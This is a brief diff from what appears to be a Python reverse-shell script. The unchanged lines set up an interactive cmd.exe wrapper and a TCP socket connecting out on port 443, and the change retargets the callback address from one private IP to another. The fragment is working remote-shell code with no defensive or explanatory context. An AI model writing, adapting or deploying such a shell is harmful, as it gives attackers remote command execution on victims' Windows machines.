@@ -35,7 +35,7 @@ class InteractiveCommand():
 		
 cp = InteractiveCommand("cmd.exe", re.compile(r"^C:\\.*>", re.M))
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '192.168.100.245'
+host = '192.168.133.176'
 port = 443
 
 sock.connect((host, port))
